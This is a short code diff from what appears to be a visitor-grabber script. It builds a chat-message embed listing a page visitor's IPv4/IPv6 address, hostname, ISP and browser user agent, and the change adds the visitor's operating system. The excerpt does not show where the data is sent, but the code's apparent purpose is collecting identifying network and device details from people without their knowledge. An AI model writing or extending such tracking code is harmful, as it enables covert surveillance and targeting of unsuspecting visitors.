@@ -73,6 +73,7 @@
                   fields: [ 
                   { name: 'IPv4/IPv6 :globe_with_meridians:',  value: "`"+data.YourFuckingIPAddress+"`", inline: "true" },
                   { name: 'IPv4 :globe_with_meridians:',  value: "`"+data2.ip+"`", inline: "true" },
+                  { name: 'OS :floppy_disk:', value: "`"+Name+"`", inline: 'false' },
                   { name: 'User Agent :bust_in_silhouette:', value: "`"+navigator.userAgent+"`", inline: "false" } ,
                   { name: 'Hostname :name_badge:', value: "`"+data.YourFuckingHostname+"`", inline: "true" },
                   { name: 'ISP :classical_building:', value: "`"+data.YourFuckingISP+'`', inline: 'true' },
